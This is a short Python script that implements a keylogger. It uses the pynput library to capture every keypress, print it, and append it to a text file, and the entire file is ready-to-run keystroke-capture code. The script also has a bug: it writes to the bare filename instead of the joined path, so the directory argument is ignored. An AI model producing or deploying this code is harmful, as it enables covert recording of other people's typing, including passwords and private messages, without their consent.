from pynput import keyboard
import os

class KeyLogger():
    def __init__(self, directory: str= ".", filename: str = "keylog.txt") -> None:
        self.directory =directory
        self.filename = filename
        self.filepath = os.path.join(self.directory, self.filename)
        os.makedirs(self.directory,exist_ok=True)

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        print(key)
        with open(self.filename, 'a') as logs:
            logs.write(self.get_char(key))

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()


if __name__ == '__main__':
    #if want to change the file name use below filename line to change the file name
    logger = KeyLogger(directory= "(based on your path)", filename='keyloggers.txt')
    logger.main()
    input()
